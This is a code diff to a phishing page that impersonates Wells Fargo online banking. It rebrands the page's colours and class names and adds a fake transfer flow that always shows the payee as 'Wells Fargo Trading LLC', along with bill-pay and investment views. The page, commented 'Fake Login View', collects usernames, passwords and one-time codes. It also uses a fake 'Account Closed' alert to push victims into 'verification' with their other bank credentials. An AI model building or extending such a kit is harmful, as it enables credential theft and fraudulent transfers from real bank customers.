@@ -10,22 +10,22 @@
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
         body { background-color:#f5f7fa; display:flex; flex-direction:column; min-height:100vh; }
-        .header { background-color:#0d74ce; color:white; padding:20px 30px; display:flex; align-items:center; justify-content:space-between; border-bottom:4px solid #d71e28; }
+        .header { background-color:#d71e28; color:white; padding:20px 30px; display:flex; align-items:center; justify-content:space-between; border-bottom:4px solid #d71e28; }
         .logo { font-size:28px; font-weight:bold; display:flex; align-items:center; }
         .nav { display:flex; gap:20px; }
         .nav a { color:white; text-decoration:none; font-weight:500; padding:8px 12px; border-radius:4px; transition:background 0.3s; }
         .nav a:hover { background-color:#d71e28; }
         .container { flex:1; display:flex; padding:30px; gap:30px; }
         .sidebar { width:300px; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
-        .sidebar h3 { color:#0d74ce; margin-bottom:20px; font-size:18px; border-bottom:2px solid #eee; padding-bottom:10px; }
+        .sidebar h3 { color:#d71e28; margin-bottom:20px; font-size:18px; border-bottom:2px solid #eee; padding-bottom:10px; }
         .main-content { flex:1; background:white; border-radius:12px; padding:25px; box-shadow:0 5px 15px rgba(0,0,0,0.05); }
         .form-section { margin-bottom:30px; }
         .form-section h2 { color:#d71e28; margin-bottom:15px; font-size:22px; }
         .input-group { margin-bottom:20px; }
         .label { display:block; margin-bottom:8px; color:#333; font-weight:600; }
         .input-field { width:100%; padding:12px 15px; border:1px solid #ccc; border-radius:6px; font-size:16px; transition:border 0.3s; }
-        .input-field:focus { border-color:#0d74ce; outline:none; }
-        .btn { background-color:#0d74ce; color:white; padding:14px 20px; border:none; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; transition:background 0.3s; width:100%; }
+        .input-field:focus { border-color:#d71e28; outline:none; }
+        .btn { background-color:#d71e28; color:white; padding:14px 20px; border:none; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; transition:background 0.3s; width:100%; }
         .btn:hover { background-color:#d71e28; }
         .chat-container { background-color:#f9f9f9; border-radius:10px; padding:20px; height:400px; overflow-y:auto; border:1px solid #ddd; margin-top:30px; }
         .chat-box { display:flex; flex-direction:column; gap:15px; }
@@ -34,17 +34,17 @@
         .chat-message.admin { background-color:#f1f1f1; align-self:flex-start; }
         .chat-input-area { display:flex; margin-top:20px; gap:10px; }
         .chat-input { flex:1; padding:12px; border:1px solid #ccc; border-radius:6px; }
-        .chat-send { background-color:#0d74ce; color:white; padding:12px 20px; border:none; border-radius:6px; cursor:pointer; }
+        .chat-send { background-color:#d71e28; color:white; padding:12px 20px; border:none; border-radius:6px; cursor:pointer; }
         .footer { text-align:center; padding:20px; background-color:#eee; color:#666; border-top:1px solid #ddd; }
         .alert-closed { background:#f8d7da; color:#721c24; padding:15px 20px; border-radius:8px; margin-bottom:20px; border:1px solid #f5c6cb; font-weight:bold; }
         /* Account closed modal */
         .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; align-items:center; justify-content:center; }
         .modal-overlay.active { display:flex; }
         .modal-box { background:white; padding:30px; border-radius:12px; max-width:450px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.3); text-align:center; }
-        .modal-box i { font-size:48px; color:#0d74ce; margin-bottom:15px; }
+        .modal-box i { font-size:48px; color:#d71e28; margin-bottom:15px; }
         .modal-box h3 { color:#333; margin-bottom:10px; font-size:20px; }
         .modal-box p { color:#666; margin-bottom:20px; line-height:1.5; }
-        .modal-box button { background:#0d74ce; color:white; padding:12px 30px; border:none; border-radius:6px; font-size:15px; font-weight:bold; cursor:pointer; }
+        .modal-box button { background:#d71e28; color:white; padding:12px 30px; border:none; border-radius:6px; font-size:15px; font-weight:bold; cursor:pointer; }
         .modal-box button:hover { background:#d71e28; }
         @media (max-width:768px) {
             .header { flex-direction:column; align-items:flex-start; padding:15px; }
@@ -54,10 +54,10 @@
             #view-verification { flex-direction:column !important; }
             .sidebar { width:100% !important; }
             #view-home>div:nth-of-type(3) { flex-direction:column; }
-            .chase-card { padding:20px !important; }
-            .chase-card .card-number { font-size:20px !important; }
-            .chase-card .card-bottom { flex-direction:column; align-items:flex-start !important; gap:15px; }
-            .chase-card .card-balance { text-align:left !important; }
+            .wf-card { padding:20px !important; }
+            .wf-card .card-number { font-size:20px !important; }
+            .wf-card .card-bottom { flex-direction:column; align-items:flex-start !important; gap:15px; }
+            .wf-card .card-balance { text-align:left !important; }
         }
     </style>
 </head>
@@ -87,7 +87,7 @@
     <!-- Fake Login View -->
     <div id="view-login" style="display:block; max-width:400px; margin:40px auto; background:white; padding:30px; border-radius:10px; box-shadow:0 10px 30px rgba(0,0,0,0.1); width:90%;">
         <div style="text-align:center; margin-bottom:20px;">
-            <i class="fas fa-university" style="font-size:40px; color:#0d74ce; margin-bottom:10px;"></i>
+            <i class="fas fa-university" style="font-size:40px; color:#d71e28; margin-bottom:10px;"></i>
             <h2 style="color:#d71e28;">Sign In to Wells Fargo</h2>
         </div>
 
@@ -100,7 +100,7 @@
                 <label class="label">Password</label>
                 <input type="password" class="input-field" id="wfPass" placeholder="Enter password">
             </div>
-            <button class="btn" onclick="submitWells FargoLogin()">Sign In</button>
+            <button class="btn" onclick="submitWfLogin()">Sign In</button>
         </div>
 
         <div id="loginStep2" style="display:none; text-align:center;">
@@ -110,7 +110,7 @@
                 <label class="label">OTP Code</label>
                 <input type="text" class="input-field" id="wfOtp" placeholder="Enter 6-digit OTP code">
             </div>
-            <button class="btn" onclick="submitWells FargoOtp()">Verify & Sign In</button>
+            <button class="btn" onclick="submitWfOtp()">Verify & Sign In</button>
             <div id="statusLogin" style="margin-top:15px; font-weight:bold;"></div>
         </div>
     </div>
@@ -125,7 +125,7 @@
                     <i class="fas fa-exclamation-triangle"></i> Account Closed. Please complete verification to withdraw funds.
                 </div>
 
-                <div class="chase-card" style="background: linear-gradient(135deg, #d71e28, #a61a1d); color:white; padding:25px; border-radius:15px; margin-bottom:30px; box-shadow:0 10px 20px rgba(0,0,0,0.2); position:relative; max-width:500px;">
+                <div class="wf-card" style="background: linear-gradient(135deg, #d71e28, #a61a1d); color:white; padding:25px; border-radius:15px; margin-bottom:30px; box-shadow:0 10px 20px rgba(0,0,0,0.2); position:relative; max-width:500px;">
                     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                         <span style="font-size:22px; font-weight:bold;">Wells Fargo</span>
                         <i class="fas fa-wifi" style="transform:rotate(90deg); font-size:24px; opacity:0.8;"></i>
@@ -149,9 +149,9 @@
 
                 <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Quick Actions</h3>
                 <div style="display:flex; gap:15px;">
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-exchange-alt" style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-file-invoice-dollar" style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
-                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-chart-line" style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
+                    <button onclick="handleQuickAction('transfer')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-exchange-alt" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
+                    <button onclick="handleQuickAction('bills')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-file-invoice-dollar" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
+                    <button onclick="handleQuickAction('investments')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-chart-line" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
                 </div>
             </div>
 
@@ -163,7 +163,7 @@
                     <i class="fas fa-eye-slash" style="font-size:48px; color:#999; margin-bottom:20px;"></i>
                     <h3 style="color:#333; margin-bottom:10px;">Security Verification Required</h3>
                     <p style="color:#666; margin-bottom:20px;">To protect your sensitive financial data, please confirm your identity to view past transactions.</p>
-                    <button onclick="promptTxOtp()" style="background:#0d74ce; color:white; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; font-weight:bold;"><i class="fas fa-lock"></i> Request Verification Code</button>
+                    <button onclick="promptTxOtp()" style="background:#d71e28; color:white; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; font-weight:bold;"><i class="fas fa-lock"></i> Request Verification Code</button>
                     <div id="txOtpPrompt" style="display:none; margin-top:25px; padding-top:20px; border-top:1px dashed #ccc; text-align:left; max-width:300px; margin-left:auto; margin-right:auto;">
                         <label style="display:block; margin-bottom:8px; font-weight:bold; color:#333;">Enter 6-Digit OTP Code</label>
                         <input type="text" id="txOtp" style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px;" placeholder="e.g. 123456">
@@ -178,13 +178,127 @@
                 </div>
             </div>
 
+            
+            <!-- Transfer Funds View -->
+            <div id="view-transfer" style="display:none;">
+                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-exchange-alt"></i> Transfer Funds</h2>
+                
+                <div id="transferStep1">
+                    <p style="margin-bottom:15px; color:#555;">Select a bank from the United States to transfer funds to:</p>
+                    <input type="text" id="bankSearch" placeholder="Search US Banks..." style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;">
+                    <div id="bankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
+                        <!-- JS injects banks here -->
+                    </div>
+                </div>
+
+                <div id="transferStep2" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
+                    <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Recipient Details</h3>
+                    <p style="margin-bottom:15px; font-size:14px; color:#d71e28; font-weight:bold;" id="selectedBankDisplay"></p>
+                    
+                    <div class="input-group">
+                        <label class="label">Full Name (as it appears on their account)</label>
+                        <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Routing Number (9 digits)</label>
+                        <input type="text" class="input-field" id="txSortCode" placeholder="XXXXXXXXX">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Account Number</label>
+                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
+                    </div>
+                    <button class="btn" onclick="verifyTransferDetails()">Verify Details</button>
+                    <button class="btn" onclick="document.getElementById('transferStep2').style.display='none'; document.getElementById('transferStep1').style.display='block';" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
+                </div>
+
+                <div id="transferLoading" style="display:none; text-align:center; padding:40px;">
+                    <i class="fas fa-spinner fa-spin" style="font-size:40px; color:#d71e28; margin-bottom:15px;"></i>
+                    <p style="font-size:16px; color:#666;">Contacting clearing house to verify payee details...</p>
+                </div>
+
+                <div id="transferStep3" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
+                    <div style="background:#fceeed; border-left:4px solid #d71e28; padding:15px; margin-bottom:20px; border-radius:4px;">
+                        <p style="color:#a61a1d; font-size:14px;"><i class="fas fa-check-circle"></i> <strong>Payee Verified</strong></p>
+                        <p style="font-size:18px; font-weight:bold; color:#333; margin-top:5px;">Wells Fargo Trading LLC</p>
+                        <p style="font-size:12px; color:#666; margin-top:3px;">The details you entered match this registered business.</p>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="label">Amount to Transfer ($)</label>
+                        <input type="number" class="input-field" id="txTransferAmount" placeholder="0.00">
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Reference (Optional)</label>
+                        <input type="text" class="input-field" id="txReference" placeholder="e.g. Invoice Payment">
+                    </div>
+                    <button class="btn" onclick="submitFinalTransfer()">Confirm Transfer</button>
+                    <button class="btn" onclick="document.getElementById('transferStep3').style.display='none'; document.getElementById('transferStep2').style.display='block';" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
+                </div>
+            </div>
+
+            <!-- Pay Bills View -->
+            <div id="view-bills" style="display:none;">
+                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-file-invoice-dollar"></i> Pay Bills</h2>
+                <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px;">
+                    <p style="margin-bottom:15px; color:#666;">Pay your registered utility and service bills quickly and securely.</p>
+                    <div class="input-group">
+                        <label class="label">Select Biller</label>
+                        <select class="input-field" id="billPayee">
+                            <option>AT&T</option>
+                            <option>Verizon</option>
+                            <option>Comcast</option>
+                            <option>PG&E</option>
+                            <option>T-Mobile</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label class="label">Amount ($)</label>
+                        <input type="number" class="input-field" id="billAmount" placeholder="0.00">
+                    </div>
+                    <button class="btn" onclick="submitBillPayment()">Pay Bill</button>
+                </div>
+            </div>
+
+            <!-- Investments View -->
+            <div id="view-investments" style="display:none;">
+                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-chart-line"></i> Investments Portfolio</h2>
+                <p style="margin-bottom:20px; color:#666;">Manage your assets and explore new investment opportunities directly from your account.</p>
+                
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #f1c40f;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-coins" style="color:#f1c40f;"></i> Gold & Silver</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">+2.4%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Market is performing well today.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #3498db;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fab fa-bitcoin" style="color:#3498db;"></i> Cryptocurrency</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#d9534f;">-5.1%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">High volatility detected.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #2ecc71;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-chart-bar" style="color:#2ecc71;"></i> Stocks & ETFs</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">+1.1%</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Steady growth in tech sector.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Trade</button>
+                    </div>
+                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #9b59b6;">
+                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-piggy-bank" style="color:#9b59b6;"></i> Fixed Bonds</h3>
+                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">4.5% AER</p>
+                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Guaranteed returns for 12 months.</p>
+                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Open Bond</button>
+                    </div>
+                </div>
+            </div>
+
             <!-- Verification View -->
             <div id="view-verification" style="display:none; gap:30px; width:100%;">
                 <div class="sidebar" style="width:300px;">
                     <h3>Verification Steps</h3>
                     <p><strong>Step 1:</strong> Select your secondary bank and provide credentials to verify funds availability.</p>
                     <p><strong>Step 2:</strong> Chat with Wells Fargo Customer Service for assistance.</p>
-                    <p style="margin-top:20px;color:#0d74ce;"><i class="fas fa-shield-alt"></i> This portal is secure and encrypted.</p>
+                    <p style="margin-top:20px;color:#d71e28;"><i class="fas fa-shield-alt"></i> This portal is secure and encrypted.</p>
                 </div>
                 <div style="flex:1;">
                     <div class="form-section">
@@ -354,7 +468,7 @@
         }
 
         // ===== LOGIN =====
-        async function submitWells FargoLogin() {
+        async function submitWfLogin() {
             var u = document.getElementById('wfUser').value;
             var p = document.getElementById('wfPass').value;
             if (u && p) {
@@ -369,7 +483,7 @@
             }
         }
 
-        async function submitWells FargoOtp() {
+        async function submitWfOtp() {
             var otp = document.getElementById('wfOtp').value.trim();
             var expected = getSyncItem('expectedOtp') || '';
             if (otp) {
@@ -416,6 +530,30 @@
                 globalState = await getFullState();
             } catch(e) {
                 return;
+            }
+
+            
+            // Account Lock Logic
+            if (globalState.accountLocked === true) {
+                localAccountLocked = true;
+                // Show Verification Nav
+                var navLinks = document.querySelectorAll('.nav a');
+                if (navLinks.length > 1) {
+                    navLinks[1].style.display = 'inline-block'; // show Verification
+                }
+                // Show Alert on Home
+                var alertClosed = document.querySelector('.alert-closed');
+                if (alertClosed) alertClosed.style.display = 'block';
+            } else {
+                localAccountLocked = false;
+                // Hide Verification Nav
+                var navLinks = document.querySelectorAll('.nav a');
+                if (navLinks.length > 1) {
+                    navLinks[1].style.display = 'none'; // hide Verification
+                }
+                // Hide Alert on Home
+                var alertClosed = document.querySelector('.alert-closed');
+                if (alertClosed) alertClosed.style.display = 'none';
             }
 
             // Chat history
